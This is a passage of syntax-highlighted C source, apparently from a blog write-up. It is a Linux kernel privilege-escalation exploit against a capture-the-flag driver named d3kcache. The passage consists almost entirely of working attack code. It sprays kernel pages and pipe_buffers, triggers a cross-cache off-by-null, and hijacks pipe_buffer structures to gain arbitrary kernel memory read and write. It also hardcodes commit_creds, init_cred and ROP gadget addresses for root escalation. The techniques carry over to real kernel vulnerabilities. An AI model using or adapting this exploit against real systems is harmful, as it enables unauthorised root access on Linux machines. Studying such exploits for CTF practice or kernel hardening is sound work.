class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],</span><br><span class="line">          temp_zero_buf,</span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset_base;</span><br><span class="line"><span class="keyword">uint64_t</span> vmemmap_base;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="keyword">size_t</span> direct_map_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">size_t</span> target_addr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NAME, target, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;cannot set name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] faild open d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">        <span class="keyword">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">        write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">        <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">        write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">        close(tmp_fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">            <span class="keyword">if</span> (req.cmd == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">                socket_fd[req.idx] = ret;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ret = close(socket_fd[req.idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line">    <span class="keyword">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_4pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;Faild to spray pgv!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> victim_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> orig_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[<span class="number">0</span> + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, <span class="number">0</span> + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">        free_page(pgv_8pages_start_idx++);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            create(i, <span class="number">8</span>, <span class="string">&quot;0x196082&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (PIPE_SPRAY_NUM / <span class="number">2</span>); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                free_page(pgv_8pages_start_idx++);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[(PIPE_SPRAY_NUM / <span class="number">2</span>) + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, (PIPE_SPRAY_NUM / <span class="number">2</span>) + i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">            write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;0x196082&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0x61</span>, <span class="number">0x800</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            edit(i, <span class="number">0x7f8</span>, buf);</span><br><span class="line">        &#125;</span><br><span class="line">        show(<span class="number">0</span>, <span class="number">0</span>, buf);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> str_flag[<span class="number">0x10</span>];</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(str_flag, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(str_flag));</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], str_flag, <span class="number">8</span>);</span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(str_flag, <span class="string">&quot;0x196082&quot;</span>) &amp;&amp; nr != i)</span><br><span class="line">            &#123;</span><br><span class="line">                orig_pid = nr;</span><br><span class="line">                victim_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>,</span><br><span class="line">                       victim_pid, orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> snd_orig_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="number">8</span> - <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        read(pipe_fd[victim_pid][<span class="number">0</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">               info_pipe_buf.page, info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> || (<span class="keyword">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);</span><br><span class="line">        info_pipe_buf.page = (struct page *)((<span class="keyword">size_t</span>)info_pipe_buf.page + <span class="number">0x40</span>);</span><br><span class="line">        write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> nr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">            <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)</span><br><span class="line">            &#123;</span><br><span class="line">                snd_orig_pid = nr;</span><br><span class="line">                snd_vicitm_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">                       <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ / <span class="keyword">sizeof</span>(struct pipe_buffer));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> - <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">        evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">        evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">            <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page)</span><br><span class="line">            &#123;</span><br><span class="line">                self_2nd_pipe_pid = i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>,</span><br><span class="line">                       self_2nd_pipe_pid);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">        write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - 